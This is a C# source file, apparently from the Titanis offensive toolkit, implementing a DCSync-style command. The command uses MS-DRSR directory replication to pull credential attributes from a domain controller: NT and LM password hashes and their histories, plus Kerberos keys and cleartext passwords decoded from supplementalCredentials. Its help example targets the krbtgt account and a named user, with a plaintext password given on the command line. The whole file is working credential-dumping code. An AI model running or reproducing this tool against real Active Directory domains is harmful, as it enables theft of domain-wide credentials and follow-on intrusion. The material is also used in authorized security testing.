using ms_drsr;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using Titanis.Cli;
using Titanis.Ldap;
using Titanis.Msrpc.Msdrsr;
using Titanis.Winterop.SamServer;
using Titanis.Winterop.Security;

namespace Dsrep;

[Command]
[Description("Requests replica changes")]
[OutputRecordType(typeof(LdapEntry), DefaultOutputStyle = OutputStyle.List, DefaultFields = [
	nameof(LdapAttributeTypes.SAMAccountName),
	nameof(LdapAttributeTypes.GivenName),
	nameof(LdapAttributeTypes.UserPrincipalName),
	nameof(LdapAttributeTypes.InstanceType),
	nameof(LdapAttributeTypes.UserAccountControl),
	nameof(LdapAttributeTypes.DBCSPwd),
	nameof(LdapAttributeTypes.UnicodePwd),
	nameof(LdapAttributeTypes.LmPwdHistory),
	nameof(LdapAttributeTypes.NtPwdHistory),
	nameof(LdapAttributeTypes.SupplementalCredentials),
	])]
[DetailedHelpText(@"This command uses {MS-DRSR] to query attributes of an object by SID, GUID, or distinguished name.

In addition to the standard attributes defined by Active Directory, you may query the special attributes kerberosKeys, kerberosOldKeys, or cleartextPassword.  When one of these attributes is specified, {0} implicitly queries supplementalCredentials and unpacks the credentials contained within.")]
[Example("Query credentials for krbtgt and milchick", "{0} -UserName milchick@LUMON -Password Br3@kr00m! LUMON-DC1 S-1-5-21-1752138614-393460150-3098146133-502, \"CN=Seth Milchick,OU=Severed Floor,OU=Kier\\, PE,DC=lumon,DC=ind\" -OutputFields samAccountName, objectSid,  kerberosKeys, kerberosOldKeys, cleartextPassword, unicodePwd, lmPwdHistory, ntPwdHistory")]
internal class ReplicateCommand : RpcCommand<DirectoryReplicationClient>
{
	[Parameter(After = nameof(RpcCommand.ServerName))]
	[Mandatory]
	public DsName[] ObjectName { get; set; }

	protected override Type InterfaceType => typeof(drsuapi);

	private string[] GetLdapAttributes(string[] fieldNames)
	{
		List<string> attrs = new(fieldNames.Length);
		HashSet<string> fieldsAdded = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
		bool wantsSuppCreds = false;
		foreach (var name in fieldNames)
		{
			if (fieldsAdded.Add(name))
			{
				var attr = LdapAttributeTypes.TryGetByNameOrOid(name);
				if (attr != null)
					attrs.Add(attr.Oid);
				else if (Array.IndexOf(SupplementalCredetialAttributes, name.ToUpper()) >= 0)
					wantsSuppCreds = true;
				else
					this.WriteWarning($"Attribute name '{name}' could not be resolved.");
			}
		}

		if (wantsSuppCreds)
			attrs.Add(LdapAttributeTypes.SupplementalCredentials.Oid);

		return attrs.ToArray();
	}

	private readonly static string[] SupplementalCredetialAttributes = [
		"KERBEROSKEYS",
		"KERBEROSOLDKEYS",
		"CLEARTEXTPASSWORD",
		];

	protected override async Task<int> RunAsync(DirectoryReplicationClient client, CancellationToken cancellationToken)
	{
		var dcInfos = await client.GetDcInfo(this.RpcParameters.Authentication.UserDomain, cancellationToken);

		var outputAttrs = GetLdapAttributes(this.OutputFields);

		foreach (var objName in this.ObjectName)
		{
			var obj = await client.GetNcChanges(dcInfos[0], objName, outputAttrs, 1, cancellationToken);

			List<LdapAttribute> returnedAttrs = new List<LdapAttribute>(obj.Attributes.Length);
			for (int i = 0; i < obj.Attributes.Length; i++)
			{
				DsAttribute? attr = obj.Attributes[i];
				var attrType = LdapAttributeTypes.TryGetByNameOrOid(attr.Oid);

				var name = attrType?.Name;
				object[] values;
				if (attrType != null && attrType.Syntax != null)
				{
					values = Array.ConvertAll(attr.Values, r => attrType.Syntax.DecodeDsrep(r.Bytes));

					if (attrType.Oid == LdapAttributeTypes.SupplementalCredentials.Oid && attr.Values.Length > 0)
					{
						var suppBytes = attr.Values[0];
						try
						{
							var suppCreds = SamServer.DecodeSupplementalCredential(suppBytes.Bytes);
							if (suppCreds.KerberosKeys.Length > 0)
								returnedAttrs.Add(new LdapAttribute(new AttributeTypeDescription(AttributeTypeDescriptionFlags.None, "kerberosKeys"), suppCreds.KerberosKeys));
							if (suppCreds.KerberosOldKeys.Length > 0)
								returnedAttrs.Add(new LdapAttribute(new AttributeTypeDescription(AttributeTypeDescriptionFlags.None, "kerberosOldKeys"), suppCreds.KerberosOldKeys));
							if (suppCreds.CleartextPassword != null)
								returnedAttrs.Add(new LdapAttribute(new AttributeTypeDescription(AttributeTypeDescriptionFlags.None, "cleartextPassword"), [suppCreds.CleartextPassword]));
						}
						catch
						{

						}
					}
				}
				else
				{
					values = Array.ConvertAll(attr.Values, r => r.Bytes);
				}

				returnedAttrs.Add(new LdapAttribute(attrType, values));
			}
			LdapEntry entry = new LdapEntry(new LdapDistinguishedName(obj.Name.Name), returnedAttrs.ToArray());

			this.WriteRecord(entry);
		}

		return 0;
	}
}
